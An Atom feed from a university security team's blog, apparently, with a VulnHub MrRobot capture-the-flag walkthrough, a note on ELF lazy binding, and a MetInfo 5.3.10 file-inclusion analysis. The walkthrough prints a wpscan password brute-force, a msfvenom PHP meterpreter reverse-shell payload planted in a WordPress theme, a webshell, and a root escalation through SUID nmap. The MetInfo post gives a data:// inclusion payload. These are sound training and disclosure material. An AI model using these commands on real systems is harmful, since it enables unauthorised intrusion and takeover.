<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DROPS攻防训练营</title>
  <subtitle>中原工学院（ZUT）攻防技术团队</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.dropsec.xyz/"/>
  <updated>2017-03-21T04:57:06.143Z</updated>
  <id>http://blog.dropsec.xyz/</id>
  
  <author>
    <name>DROPS</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻破MrRobot-黑客技能训练</title>
    <link href="http://blog.dropsec.xyz/2017/03/20/%E6%94%BB%E7%A0%B4MrRobot-%E9%BB%91%E5%AE%A2%E6%8A%80%E8%83%BD%E8%AE%AD%E7%BB%83/"/>
    <id>http://blog.dropsec.xyz/2017/03/20/攻破MrRobot-黑客技能训练/</id>
    <published>2017-03-20T11:28:34.000Z</published>
    <updated>2017-03-21T04:57:06.143Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.vulnhub.com" target="_blank" rel="external">vulhub</a>是提供集成漏洞环境平台。用户可以下载已经打包好的镜像进行练习。本文介绍<a href="https://download.vulnhub.com/mrrobot/mrRobot.ova" target="_blank" rel="external">MrRobot</a>环境的利用。<br><a id="more"></a></p>
<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><h4 id="第一步：找到靶机的ip地址，寄出神器nmap"><a href="#第一步：找到靶机的ip地址，寄出神器nmap" class="headerlink" title="第一步：找到靶机的ip地址，寄出神器nmap"></a>第一步：找到靶机的ip地址，寄出神器nmap</h4><p>开始一直找不到靶机的地址，解决方法，桥接模式且复制物理网络连接状态，重启之后就扫到了<br><img src="http://i1.piimg.com/567571/98f19b9342d67c3e.png" alt=""></p>
<p><img src="http://i1.piimg.com/567571/80535c965880082b.png" alt=""></p>
<h4 id="第二步：打开靶机"><a href="#第二步：打开靶机" class="headerlink" title="第二步：打开靶机"></a>第二步：打开靶机</h4><p><img src="http://p1.bpimg.com/567571/0f49b2c6de5d84ee.png" alt=""><br><!--more--></p>
<h4 id="第三步：扫描开放的端口"><a href="#第三步：扫描开放的端口" class="headerlink" title="第三步：扫描开放的端口"></a>第三步：扫描开放的端口</h4><p><img src="http://p1.bqimg.com/567571/2a391542fb78878b.png" alt=""></p>
<h4 id="第四步：利用nikto扫描一下网站"><a href="#第四步：利用nikto扫描一下网站" class="headerlink" title="第四步：利用nikto扫描一下网站"></a>第四步：利用nikto扫描一下网站</h4><p>Nikto是一款开放源代码，功能强大的WEB扫描评估软件，能对服务器多种安全项目进行测试的扫描工具，去寻找已知有名的漏洞；</p>
<p>利用nitko命令可以帮助我们收集像文件信息和其他的主要的信息，渗透之前我们不需了解我们的目标</p>
<ul>
<li>nitko -h 192.168.0.163<br><img src="http://i1.piimg.com/567571/4737661d4c4f78d1.png" alt=""><br>我们很快的得到这是一个wordpress的站<h3 id="注射过程"><a href="#注射过程" class="headerlink" title="注射过程"></a>注射过程</h3><h4 id="前戏"><a href="#前戏" class="headerlink" title="前戏"></a>前戏</h4>Ctrl+u查看网站源代码，不过貌似并没有什么卵用，<code>var USER_IP=&#39;208.185.115.6</code>查看另一个ip地址，大概是调用了这个ip地址的js或其它的文件<br><img src="http://p1.bpimg.com/567571/70d82a35997f11fd.png" alt=""><br>根据前面收集到的信息，有robots.txt文件，进行拿站的常规思路，收获了一点点信息<br><img src="http://p1.bpimg.com/567571/20cbb3281410f3e9.png" alt=""><br>根据robots.txt收集到的信息，得到第一个flag<br><img src="http://i1.piimg.com/567571/1e8bc148e8b5b4bf.png" alt=""><br>访问<a href="http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破" target="_blank" rel="external">http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破</a><br><img src="http://p1.bqimg.com/567571/e88bf075db7aac99.png" alt=""><h4 id="渗透之旅"><a href="#渗透之旅" class="headerlink" title="渗透之旅"></a>渗透之旅</h4>根据之前利用nitko扫描到的信息，可以知道网站的后台是/wp-login.php这也是wordpress默认后台的地址</li>
</ul>
<p>得到了密码字典，紧接着一个问题又跟来了，用户名是什么，继续搞，没有思路了，蓝瘦香菇，突然翻到前面的时候，灵光一闪<br><img src="http://i1.piimg.com/567571/ce5d15f7ecccb946.png" alt=""><br>接着搞起来，然而/fuction,/join等都是找不到页面不应该呀，先把字典下载<br><img src="http://i1.piimg.com/567571/92a5656a736a9994.png" alt=""><br>还是没有思路，明明给了提示咋还是搞不定，原来是自己傻了，明明页面就给了命令端，而自己傻了吧唧的往url上面输，自己笨怪谁呀</p>
<p>接下来我尝试命令<code>inform</code>,展现在眼前的是一个hactivism类型的宣传<br><img src="http://p1.bqimg.com/567571/345dab3f5206037b.jpg" alt=""><br>大约读了读也没有找到可以说没有找到什么有用的信息，当我输入命令<code>question</code>,又是令我费解的产生了几张图片，直觉给我，这里面是充满故事的<br><img src="http://i1.piimg.com/567571/eb93df3c0574e5c8.jpg" alt=""><br>当我试图去搜索<code>executive everyone steals that&#39;s how it works</code>，从google中得到了一个有用的信息，似乎和这道题有关系<code>https://www.tvfanatic.com/quotes/shows/mr-robot/episodes/hellofriendmov/</code>,其中有一个人名Elliot，抱着尝试的态度<br><img src="http://p1.bpimg.com/567571/21d088fd2082f6bb.png" alt=""><br>看到这个错误提醒我知道，用户名正确了，因为之前尝试admin等直接给出的是用户名错误，用户名有了，剩下的就只有利用wpscan来爆破用户名登陆了；<br><img src="http://i1.piimg.com/567571/eda7aaf6237548ed.png" alt=""><br><code>wpscan --url 192.168.0.163 --threads 20--wordlist /root/Desktop/fsocity.dic --username Elliot</code></p>
<pre><code>--threads参数：设置线程
--wordlist参数：设置字典文件的路径
--username参数：设置wordpress的用户名
</code></pre><p>然后就可以顺利登陆进来了<br><img src="http://i1.piimg.com/567571/2efc542d0edf179d.png" alt=""><br>剩下的就是利用wordpress的版本找漏洞了，这里有两个思路，一个就是利用<code>msfvenom</code>生成木马提权，第二个就是利用wordpress版本曝出的漏洞来进行提权渗透</p>
<h4 id="方法一：利用kali中的msfvenm"><a href="#方法一：利用kali中的msfvenm" class="headerlink" title="方法一：利用kali中的msfvenm"></a>方法一：利用kali中的msfvenm</h4><p>msfvenom是一个独立于Metasploit框架之上的后门生成工具，它是原有旧版的msfpayload和msfencode的集合。新版的Metasploit Framework已经没有这两个工具。</p>
<p>常用的参数：</p>
<ul>
<li>-p：需要使用的攻击载荷</li>
<li>-f：输出载荷的格式，可以使用–help-formates列出所有可用格式</li>
<li>-o:指定输出位置</li>
<li>lhost：payload参数，指定反向连接服务端地址</li>
<li>lport：payload参数，指定反向链接服务端端口</li>
<li>-k：配置攻击载荷在独立的线程中启动，不影响宿主程序的运行</li>
<li>查看所有linux可用的payload：msfvenom -l payloads| grep linu</li>
</ul>
<p>生成payload:<code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=1234 -f raw</code><br><img src="http://i1.piimg.com/567571/6fff28dc84860828.png" alt=""><br>复制代码从&lt;php die();到wordpress后台模板并保存<br><img src="http://i1.piimg.com/567571/036db0bce07bc6db.png" alt=""><br>接下来就是注射阶段了</p>
<pre><code>Use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set lhost 192.168.0.107

set lport 4444

exploit
</code></pre><p><img src="http://i1.piimg.com/567571/8575b3bf1079ba55.png" alt=""><br>一旦执行了漏洞，现在需要的就是在浏览器中访问后门文件<code>http://192.168.0.163/wp-content/themes/twentyfifteen/404.php</code><br><img src="http://i1.piimg.com/567571/0e6f9a81fbbb4e2e.png" alt=""><br>成功了，结果还是可喜的<br><img src="http://i1.piimg.com/567571/1e75756ec4bb4e92.png" alt=""><br>这样就可以轻松获取一个webshell了，接下来就是进入目标用户，并可以知道所有的用户类型信息</p>
<pre><code>ls -lsa (获取用户详细的信息)

cd home 

ls -lsa 

cd robot 
</code></pre><p><img src="http://p1.bpimg.com/567571/fc216e55db9427fa.png" alt=""></p>
<p><img src="http://p1.bpimg.com/567571/00be7e9d8960091c.png" alt=""><br>成功了三分之二了，剩下的一关又找不到头绪，但是之前做程序员游戏那个每个信息都是有用的，眼前这个password.raw-md5觉得可以动动脑筋，思路是不会错的,做到后面我才知道，其实我并没有到第二关，看过程<br><img src="http://p1.bqimg.com/567571/8008d2b4066470ab.png" alt=""><br>其中前面的MD5解密后的结果就是下面的密码，我服<br><img src="http://p1.bqimg.com/567571/c66edf66bfcd8e1c.png" alt=""></p>
<p>下面这个就是技巧，干货，利用nmap形成一个interactive shell<br><img src="http://p1.bqimg.com/567571/eaf382603ed7c04d.png" alt=""></p>
<pre><code>nmap 

nmap –interactive（用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中）

!sh（nmap有SUID位，故可以通过“!sh”我们会获取到一个root权限的shell，其含义就是代码由bash shell解释）

id 

cd /root 
</code></pre><p><img src="http://i1.piimg.com/567571/69e055a6f232cfe6.png" alt=""></p>
<h4 id="补充之后又get到的用户名密码"><a href="#补充之后又get到的用户名密码" class="headerlink" title="补充之后又get到的用户名密码"></a>补充之后又get到的用户名密码</h4><p>利用sort命令，它可以帮我们依据不同的数据类型进行排序，-n参数是依照熟知的大小排序<br><img src="http://p1.bqimg.com/567571/e064d2932259b513.png" alt=""><br><img src="http://p1.bqimg.com/567571/40bffdba8eff811f.png" alt=""></p>
<h4 id="方法二：利用wordpress版本漏洞getshell"><a href="#方法二：利用wordpress版本漏洞getshell" class="headerlink" title="方法二：利用wordpress版本漏洞getshell"></a>方法二：利用wordpress版本漏洞getshell</h4><p>经过goole在github找到一个wordpress-shell，链接<a href="https://github.com/leonjza/wordpress-shell" target="_blank" rel="external">wordpress-shell</a></p>
<p>过程：<br><img src="http://p1.bpimg.com/567571/e44ed1c058292763.png" alt=""><br>接着访问<code>http://192.168.0.163/wp-content/plugins/shell/shell.php</code><br>根据readme，访问<code>http://192.168.0.163/wp-content/plugins/shell/shell.php?cmd=id</code><br>这个思路没有搞定，现在直接尝试一句话</p>
<p>利用思路二，从插件，已安装的插件，编辑，插入一句话木马，相对地址<code>/wp-content/plugins/</code><br><img src="http://p1.bqimg.com/567571/c3515f7123cd4ff8.png" alt=""><br>shell相对地址/wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php</p>
<p>菜刀连接:<br><img src="http://p1.bpimg.com/567571/a8d9c05824ac8ea4.png" alt=""><br>翻目录看到<br><img src="http://p1.bpimg.com/567571/c47bbcc0e70bdb39.png" alt=""><br>说明我们这个只是apache用户的权限，robot用户的部分权限。<br><img src="http://p1.bpimg.com/567571/5ee01b34e66c2707.png" alt=""><br>其实方法一我们就可以在知道，下载下来里面的内容是<code>ERROR:// Can Not Read</code>,但是password.raw-md5可以下载，Notepad++打开，可以看到那段密码，这个过程省略</p>
<p>最后就是在webshell执行以下脚本<a href="http://pan.baidu.com/s/1boGz8CJ" target="_blank" rel="external">百度云-密码7k6j</a><br><img src="http://p1.bqimg.com/567571/1bbff7ee5634d833.png" alt=""><br>将数据转发至本机，先反弹回来一个半交互的shell<br><img src="http://p1.bqimg.com/567571/8269ae5f111988d4.png" alt=""><br>由于权限低，利用代码<code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code>获取一个完整的交互式shell</p>
<p><img src="http://p1.bqimg.com/567571/27ab589c8dea3753.png" alt=""></p>
<p>接下来的提权过程和上面就大同小异啦</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>难点就在第三关的提权环节，这一点要回归到Linux文件权限的问题。在Linux中除了文件的基本权限-rwxrwxrwx，还有就是文件的特殊权限，就是SUID和SGID以及SBIT，大致说一下他们的含义</p>
<ul>
<li>SUID含义：SUID shell是一种可用于以拥有者权限运行的shell。也就是说，如果拥有者是root，那你就可能以root的</li>
<li>SGID含义：对文件而言是以文件所属身份执行，而更重要的是对目录的权限</li>
<li>SBIT含义：要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映像，这样做是为了节省大型程序的启动时间，但是会占用系统资源</li>
</ul>
<p>所以我们利用SUID的权限漏洞，利用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找所有用户有SUID权限的文件。<br><img src="http://i1.piimg.com/567571/458762f03a7ea2a1.png" alt=""><br>通过列出的目录发现了nmap，低版本的nmap支持“interactive.”选项，用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中，通过nmap就可以拿到交互的shell，因为nmap有SUID位，所以通过<code>!sh</code>就会获取到一个root权限的shell。</p>
<p><code>最后强调一点，学习nc等，首先要懂socket通信，归根就是网络</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.vulnhub.com&quot;&gt;vulhub&lt;/a&gt;是提供集成漏洞环境平台。用户可以下载已经打包好的镜像进行练习。本文介绍&lt;a href=&quot;https://download.vulnhub.com/mrrobot/mrRobot.ova&quot;&gt;MrRobot&lt;/a&gt;环境的利用。&lt;br&gt;
    
    </summary>
    
      <category term="Web渗透" scheme="http://blog.dropsec.xyz/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="http://blog.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="CTF" scheme="http://blog.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>延迟绑定技术原理</title>
    <link href="http://blog.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
    <id>http://blog.dropsec.xyz/2017/02/24/延迟绑定技术原理/</id>
    <published>2017-02-24T05:32:45.000Z</published>
    <updated>2017-03-16T05:43:11.560Z</updated>
    
    <content type="html"><![CDATA[<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。<br><a id="more"></a><br>延迟绑定的实现步骤如下：</p>
<p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，接下来会讲。<br>对每一个全局函数，链接器生成一个与之相对应的影子函数，如 fun@plt。<br>所有对 fun 的调用，都换成对 fun@plt 的调用，每个fun@plt 长成如下样子：<br><figure class="highlight crystal"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">fun</span>@<span class="title">plt</span></span>:</div><div class="line">jmp *(<span class="function"><span class="keyword">fun</span>@<span class="title">got</span></span>.plt)</div><div class="line">push index</div><div class="line">jmp _init</div></pre></td></tr></table></figure></p>
<p>其中第一条指令直接从 got.plt 中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt 就已经保存了真实的地址，如果是第一次调用，则 got.plt 中放的是 fun@plt 中的第二条指令，这就使得当执行第一次调用时，fun@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在 got.plt 中的编号作为参数传给 _init()，而 _init() 这个函数则用于把 fun 进行重定位，然后把结果写入到 got.plt 相应的地方，最后直接跳过去该函数。</p>
<p>仍然是使用前面的例子，我们看看 g_func2 是怎样调用 g_func 的:<br><figure class="highlight llvm"><table><tr><td class="code"><pre><div class="line"><span class="number">0000052</span>f &lt;g_func<span class="number">2</span>&gt;:</div><div class="line"><span class="number">52</span>f:   <span class="number">55</span>                      push   <span class="symbol">%ebp</span></div><div class="line"><span class="number">530</span>:   <span class="number">89</span> e<span class="number">5</span>                   mov    <span class="symbol">%esp</span>,<span class="symbol">%ebp</span></div><div class="line"><span class="number">532</span>:   <span class="number">53</span>                      push   <span class="symbol">%ebx</span></div><div class="line"><span class="number">533</span>:   <span class="number">83</span> ec <span class="number">14</span>                <span class="keyword">sub</span>    $<span class="number">0x14</span>,<span class="symbol">%esp</span></div><div class="line"><span class="number">536</span>:   e<span class="number">8</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   <span class="number">53</span>b &lt;g_func<span class="number">2</span>+<span class="number">0xc</span>&gt;</div><div class="line"><span class="number">53</span>b:   <span class="number">5</span>b                      pop    <span class="symbol">%ebx</span></div><div class="line"><span class="number">53</span><span class="keyword">c</span>:   <span class="number">81</span> <span class="keyword">c</span><span class="number">3</span> <span class="number">91</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">add</span>    $<span class="number">0x1191</span>,<span class="symbol">%ebx</span></div><div class="line"><span class="number">542</span>:   <span class="keyword">c</span><span class="number">7</span> <span class="number">45</span> f<span class="number">8</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x2</span>,<span class="number">0xfffffff8</span>(<span class="symbol">%ebp</span>) // a = <span class="number">2</span></div><div class="line"><span class="number">549</span>:   <span class="number">83</span> ec <span class="number">0</span><span class="keyword">c</span>                <span class="keyword">sub</span>    $<span class="number">0xc</span>,<span class="symbol">%esp</span></div><div class="line"><span class="number">54</span><span class="keyword">c</span>:   <span class="number">6</span>a <span class="number">03</span>                   push   $<span class="number">0x3</span> // push argument <span class="number">3</span> for g_func.</div><div class="line"><span class="number">54</span>e:   e<span class="number">8</span> d<span class="number">5</span> fe ff ff          <span class="keyword">call</span>   <span class="number">428</span> &lt;g_func<span class="title">@plt</span>&gt;</div><div class="line"><span class="number">553</span>:   <span class="number">83</span> <span class="keyword">c</span><span class="number">4</span> <span class="number">10</span>                <span class="keyword">add</span>    $<span class="number">0x10</span>,<span class="symbol">%esp</span></div><div class="line"><span class="number">556</span>:   <span class="number">89</span> <span class="number">45</span> f<span class="number">4</span>                mov    <span class="symbol">%eax</span>,<span class="number">0xfffffff4</span>(<span class="symbol">%ebp</span>)</div><div class="line"><span class="number">559</span>:   <span class="number">8</span>b <span class="number">45</span> f<span class="number">4</span>                mov    <span class="number">0xfffffff4</span>(<span class="symbol">%ebp</span>),<span class="symbol">%eax</span></div><div class="line"><span class="number">55</span><span class="keyword">c</span>:   <span class="number">03</span> <span class="number">45</span> f<span class="number">8</span>                <span class="keyword">add</span>    <span class="number">0xfffffff8</span>(<span class="symbol">%ebp</span>),<span class="symbol">%eax</span></div><div class="line"><span class="number">55</span>f:   <span class="number">8</span>b <span class="number">5</span>d fc                mov    <span class="number">0xfffffffc</span>(<span class="symbol">%ebp</span>),<span class="symbol">%ebx</span></div><div class="line"><span class="number">562</span>:   <span class="keyword">c</span><span class="number">9</span>                      leave  </div><div class="line"><span class="number">563</span>:   <span class="keyword">c</span><span class="number">3</span>                      <span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>如上汇编，指令 536, 53b, 53c, 用于计算 got.plt 的具体位置，计算方式与前面对数据的访问原理是一样的，经计算此时, %ebx = 0x53b + 0x1191 = 0x16cc, 注意指令 54e， 该指令调用了函数 g_func@plt:<br><figure class="highlight basic"><table><tr><td class="code"><pre><div class="line"><span class="symbol">00000428 </span>&lt;g_func@plt&gt;:</div><div class="line"><span class="number">428</span>:   ff a3 <span class="number">0</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       jmp    *<span class="number">0</span>xc(%ebx)</div><div class="line"><span class="number">42e</span>:   <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0</span>x0</div><div class="line"><span class="number">433</span>:   e9 e0 ff ff ff          jmp    <span class="number">418</span> &lt;_init+<span class="number">0</span>x18&gt;</div></pre></td></tr></table></figure></p>
<p>注意到此时， %ebx 中放的是 got.plt 的地址，g_func@plt 的第一条指令用于获取 got.plt 中 func 的具体地址， func 放在 0xc + %ebx = 0xc + 0x16cc = 0x16d8, 这个地址里放的是什么呢？我们查一下重定位表：<br><figure class="highlight sqf"><table><tr><td class="code"><pre><div class="line">-bash-<span class="number">3.00</span>$ objdump -R liba.so</div><div class="line"></div><div class="line">liba.so:     file <span class="built_in">format</span> elf32-i386</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET   <span class="built_in">TYPE</span>              VALUE</div><div class="line"><span class="number">000016</span>e0 R_386_RELATIVE    *<span class="built_in">ABS</span>*</div><div class="line"><span class="number">000016</span>e4 R_386_RELATIVE    *<span class="built_in">ABS</span>*</div><div class="line"><span class="number">000016</span>bc R_386_GLOB_DAT    g_share</div><div class="line"><span class="number">000016</span>c0 R_386_GLOB_DAT    <span class="variable">__cxa_finalize</span></div><div class="line"><span class="number">000016</span>c4 R_386_GLOB_DAT    <span class="variable">_Jv_RegisterClasses</span></div><div class="line"><span class="number">000016</span>c8 R_386_GLOB_DAT    <span class="variable">__gmon_start__</span></div><div class="line"><span class="number">000016</span>d8 R_386_JUMP_SLOT   g_func</div><div class="line"><span class="number">000016</span>dc R_386_JUMP_SLOT   <span class="variable">__cxa_finalize</span></div></pre></td></tr></table></figure></p>
<p>可见，该地址里放的就是 g_func 的具体地址，那此时 0x16d8 放的是真正的地址了吗？我们再看看 got.plt:<br><figure class="highlight clean"><table><tr><td class="code"><pre><div class="line">Contents <span class="keyword">of</span> section .got.plt:</div><div class="line"><span class="number">16</span>cc fc150000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">2e040000</span>  ................</div><div class="line"><span class="number">16</span>dc <span class="number">3e040000</span></div></pre></td></tr></table></figure></p>
<p>16d8 处的内容是: 2e040000, 小端序，换回整形就是 0x000042e, 该地址就是 fun@plt 的第二条指令！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。&lt;br&gt;主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。&lt;br&gt;另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。&lt;br&gt;
    
    </summary>
    
    
      <category term="System" scheme="http://blog.dropsec.xyz/tags/System/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo5.3.10 CMS 命令执行 文件包含</title>
    <link href="http://blog.dropsec.xyz/2016/11/27/Metinfo5-3-10-CMS-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://blog.dropsec.xyz/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含/</id>
    <published>2016-11-27T14:55:21.000Z</published>
    <updated>2017-03-14T13:56:13.964Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-MetInfo"><a href="#0x00-MetInfo" class="headerlink" title="0x00 MetInfo"></a>0x00 MetInfo</h3><p>MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。<br><a id="more"></a></p>
<h3 id="0x01-命令执行-文件包含"><a href="#0x01-命令执行-文件包含" class="headerlink" title="0x01 命令执行 文件包含"></a>0x01 命令执行 文件包含</h3><p><strong>命令执行：</strong>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令<br>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><!-- more --><br><strong>文件包含：</strong>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
<p>此次产生漏洞的版本号为Metinfo5.3.10，源码大家可以下载。</p>
<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>文件admin/login/login_check.php：26行<br><figure class="highlight awk"><table><tr><td class="code"><pre><div class="line"> f(<span class="variable">$action</span>==<span class="string">"login"</span>)&#123;</div><div class="line">    <span class="variable">$metinfo_admin_name</span>     = <span class="variable">$login_name</span>;</div><div class="line">    <span class="variable">$metinfo_admin_pass</span>     = <span class="variable">$login_pass</span>;</div><div class="line">    <span class="variable">$metinfo_admin_pass</span>=md5(<span class="variable">$metinfo_admin_pass</span>);</div><div class="line">    <span class="regexp">/*code*/</span></div><div class="line">    <span class="keyword">if</span>(<span class="variable">$met_login_code</span>==<span class="number">1</span>)&#123;</div><div class="line">       require_once <span class="variable">$depth</span>.<span class="string">'../include/captcha.class.php'</span>;</div><div class="line">       <span class="variable">$Captcha</span>= new  Captcha();</div><div class="line">       <span class="keyword">if</span>(!<span class="variable">$Captcha</span>-&gt;CheckCode(<span class="variable">$code</span>))&#123;</div><div class="line">      echo(<span class="string">"&lt;script type='text/javascript'&gt;alert('$lang_logincodeerror');location.href='login.php?langset=$langset';&lt;/script&gt;"</span>);</div><div class="line">      <span class="keyword">exit</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>登录检测的，当后台开启登录校验码的时候$met_login_code会设置为1，然后require_once 去包含校验码登录文件。只要我们控制了变量$depth就可以进行远程文件包含了。</p>
<p>而$depth变量是在文件’admin/login/login_check.php’开头定义的。<br><figure class="highlight lasso"><table><tr><td class="code"><pre><div class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</div><div class="line"><span class="keyword">if</span>($depth!=<span class="string">''</span>&amp;&amp;$depth!=<span class="string">'../'</span>&amp;&amp;$depth!=<span class="string">'../../'</span>)&#123;die();&#125;</div><div class="line"><span class="keyword">if</span>(!isset($depth))$depth=<span class="string">''</span>;</div><div class="line">$commonpath=$depth.<span class="string">'include/common.inc.php'</span>;</div><div class="line">$commonpath=$admin_index?$commonpath:<span class="string">'../'</span>.$commonpath;</div><div class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">'SQL_DETECT'</span>,<span class="number">1</span>);</div></pre></td></tr></table></figure></p>
<p>通过第一次拼接$depth包含了include/common.inc.php，前面几步可能没什么问题，这一步也没有问题的，包含了文件common.inc.php之后，但是common.inc.php中可以通过以下代码进行变量覆盖。</p>
<p>文件：include/common.inc.php：35<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;    <span class="comment">// 遍历数组</span></div><div class="line"></div><div class="line"><span class="comment">// $$_request分别是$_COOKIE, $_POST, $_GET，对应http请求提交过来的相应数据</span></div><div class="line"> <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;           <span class="comment">// 分别遍历该数据</span></div><div class="line">  </div><div class="line">  $_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);     <span class="comment">// 对数据中的值进行转义</span></div><div class="line">  $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对页面提交过来的数据，包括cookie，post, get三种数据进行转义。</p>
<p>但是此处却存在一个变量覆盖漏洞，这里我们简单本地演示一下：<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"></div><div class="line">$a=<span class="string">'hello'</span>;</div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</div><div class="line">$$key = $value;</div><div class="line">&#125;</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://i1.piimg.com/567571/d5b5e87512c79439.png" alt=""> </p>
<p>当我们get提交一个a值时，它会覆盖掉以前所定义，产生变量覆盖<br><img src="http://i1.piimg.com/567571/4b634cadfa654e5f.png" alt=""></p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>我们可以利用变量覆盖漏洞覆盖掉变量$deph。</p>
<p>本地文件包含用require_once来执行代码，但是<br><figure class="highlight perl"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>($depth!=<span class="string">''</span>&amp;&amp;$depth!=<span class="string">'../'</span>&amp;&amp;$depth!=<span class="string">'../../'</span>)&#123;<span class="keyword">die</span>();&#125;</div></pre></td></tr></table></figure></p>
<p>对depth进行了过滤，我们可以使用php的封装协议data://配合require_once来进行恶意代码执行。<br>还有一个问题<br><figure class="highlight nginx"><table><tr><td class="code"><pre><div class="line"><span class="attribute">require_once</span> <span class="variable">$depth</span>.<span class="string">'../include/captcha.class.php'</span>;</div></pre></td></tr></table></figure></p>
<p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
<p>用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
<p>封装器解码之后代码的样子<br><figure class="highlight awk"><table><tr><td class="code"><pre><div class="line">&lt;?php phpinfo();<span class="keyword">exit</span>();<span class="regexp">//</span> ..þ)Üç^ýÆ©µÈZ.rV¬s.php</div></pre></td></tr></table></figure></p>
